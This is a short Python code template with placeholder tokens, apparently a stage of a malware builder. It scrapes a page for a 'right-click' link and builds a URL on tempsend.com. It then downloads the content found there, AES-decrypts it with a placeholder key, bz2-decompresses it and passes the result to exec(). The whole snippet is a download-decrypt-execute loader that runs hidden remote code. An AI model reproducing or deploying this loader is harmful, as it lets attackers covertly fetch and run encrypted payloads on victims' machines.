for line in ***URLO***("***URL***").read().split('\n'):
	if 'right-click' in line:
		url = 'http://tempsend.com' + line.split('"')[1]
		break
exec(***AESVAR***.new("***AESKEY***").decrypt(***URLO***(url).read()[***OFFSET***:]).rstrip('{').decode('bz2'))
